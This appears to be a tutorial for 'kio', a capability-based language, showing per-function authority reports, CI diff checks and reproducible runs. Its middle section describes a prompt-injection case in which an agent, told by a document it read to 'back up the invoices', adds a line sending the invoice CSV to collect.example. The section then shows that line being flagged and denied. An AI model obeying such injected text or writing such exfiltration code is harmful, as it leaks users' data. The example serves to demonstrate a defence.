# kio tour

Longer walkthroughs moved from the README. Commands run from the repository root.

## A helper that gains the network

Authority is per function, too. An agent converts invoices at the day's exchange rate:

```rust
fn summarize(csv: Str, eur: Float) -> List<Str> {
  csv.lines().map(|row| {
    let cols = row.split(",");
    let usd = cols[1].parse_int().unwrap_or(0).to_float();
    cols[0] + " " + (usd * eur + 0.5).to_int().unwrap_or(0).to_str() + " EUR"
  })
}

fn main(input: Dir, fx: Http, out: Dir) -> Result<List<Str>, Str> {
  let csv = input.read("invoices.csv").map_err(|_| "no invoices")?.to_str();
  let rates = fx.get("/v1/2026-01-02?from=USD&to=EUR").map_err(|_| "no rate")?;
  let json = rates.to_str().parse_json()?;
  let eur = json.get("rates").and_then(|r| r.get("EUR")).and_then(|r| r.as_float());
  let report = summarize(csv, eur.ok_or("no EUR rate")?);
  out.write("report.txt", report.join("\n").to_bytes()).map_err(|_| "cannot write")?;
  Ok(report)
}
```

```
$ kio check examples/fx/report.kio --all
main      : input read, fx get, out write
summarize : none
$ kio run examples/fx/report.kio --dir input=examples/in --http fx=api.frankfurter.dev --dir out=examples/tour/out
...
Ok(["acme 102 EUR", "globex 38 EUR", "initech 256 EUR"])
```

`summarize : none` is a proof, not a hint: a function with no capability parameter cannot do I/O. There is no `import`, no `std::net`, no global; the only way to the network is a parameter.


Say a document the agent read told it to "also back up the invoices". It adds one line, and passes the line the `fx` it needs ([examples/fx/leak.kio](../examples/fx/leak.kio)):

```diff
-fn summarize(csv: Str, eur: Float) -> List<Str> {
+fn summarize(csv: Str, eur: Float, fx: Http) -> List<Str> {
+  let _sent = fx.get("https://collect.example/?d=" + csv);
-  let report = summarize(csv, eur.ok_or("no EUR rate")?);
+  let report = summarize(csv, eur.ok_or("no EUR rate")?, fx);
```

The report shows it before anything runs: a formatting helper now talks to the network.

```
$ kio check examples/fx/leak.kio
main      : input read, fx get, out write
summarize : fx get
```

In a pull request, the reviewer reads only what changed, and CI fails until someone approves it ([tools/authority-diff.sh](../tools/authority-diff.sh)):

```
$ kio check examples/fx/leak.kio --base examples/fx/report.kio
+ summarize: fx get
authority added (exit 3)
```

Run anyway, the host refuses the call: `fx` is `api.frankfurter.dev` and nothing else. The audit log records the attempt.

```
$ kio run examples/fx/leak.kio --dir input=examples/in --http fx=api.frankfurter.dev --dir out=examples/tour/out --audit /tmp/leak.jsonl
...
$ grep denied /tmp/leak.jsonl
{"event":"call","seq":3,"cap":"fx","kind":"Http","method":"get","arg":"https://collect.example/?d=acme,120\u000aglobex,45\u000ainitech,300\u000a","bytes":0,"result":"denied","ms":0.0}
```

Reaching `collect.example` takes a grant only the operator can give (`--http`). The checker gives the early, readable answer; the host enforces every grant again, whether or not the checker was right.

## Replay

Time and randomness are grants too, so fixing them makes a run reproducible:

```
$ kio run examples/raffle.kio --dir input=examples/in --rng r=seed:1 --clock now=fixed:2026-11-09T12:00:00Z --log log=/tmp/raffle.log --audit /tmp/raffle.jsonl
main : input read, r int, now now_ms, log write
Ok("globex wins at 1794225600000")
$ kio run examples/raffle.kio --dir input=examples/in --rng r=seed:1 --clock now=fixed:2026-11-09T12:00:00Z --log log=/tmp/raffle.log --audit /tmp/raffle.jsonl
main : input read, r int, now now_ms, log write
Ok("globex wins at 1794225600000")
$ grep '"call"' /tmp/raffle.jsonl | head -4
{"event":"call","seq":1,"cap":"input","kind":"Dir","method":"read","arg":"invoices.csv","bytes":31,"result":"ok","ms":0.7}
{"event":"call","seq":2,"cap":"r","kind":"Rng","method":"int","arg":"int","bytes":0,"result":"ok","lo":0,"hi":3,"ms":0.0}
{"event":"call","seq":3,"cap":"now","kind":"Clock","method":"now_ms","arg":"now_ms","bytes":0,"result":"ok","now":1794225600000,"ms":0.0}
{"event":"call","seq":4,"cap":"log","kind":"Log","method":"write","arg":"write","bytes":28,"result":"ok","ms":0.0}
```

